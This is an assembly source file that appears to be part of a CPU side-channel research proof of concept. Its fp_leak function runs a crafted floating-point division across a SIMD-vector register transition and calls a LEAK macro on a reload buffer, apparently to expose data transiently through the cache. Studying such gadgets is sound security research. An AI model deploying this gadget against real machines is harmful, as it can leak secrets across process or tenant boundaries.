%include "common.S"

%define X_VAL   0x0010000000000000
%define Y_VAL   0x4340000000000000

section .data noexec write
    ;Memory for xmm backup
    align 64
    fp_regs:
    %rep 0x1000
    db  0x0
    %endrep

    align 64
    x:
    %rep 8
    dq X_VAL
    %endrep

    align 64
    y:
    %rep 8
    dq Y_VAL
    %endrep

section .text
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; fp_leak(uint8_t *reload_buffer, uint8_t *ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global fp_leak
align 64
fp_leak:
    ;Backup used xmm registers + Setup
    movdqu  [fp_regs]   , xmm0 
    movdqu  [fp_regs+64], xmm1 


    movsd xmm0, [x]
    movsd xmm1, [y]

;;;;;; SIMD-Vector transition ;;;;;;
    vxorpd ymm10, ymm10, ymm10
    xorpd xmm11, xmm11
    vaddpd ymm10, ymm10, ymm0
    vaddpd ymm11, ymm11, ymm1
    divsd xmm10, xmm11
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    movq    rax, xmm10
    cmp     rax, 0
    je      fp_leak_arch
    LEAK    rdi, rsi
fp_leak_arch:
    ;Restore used xmm registers
    movdqu  xmm0, [fp_regs]
    movdqu  xmm1, [fp_regs+64]
    ret
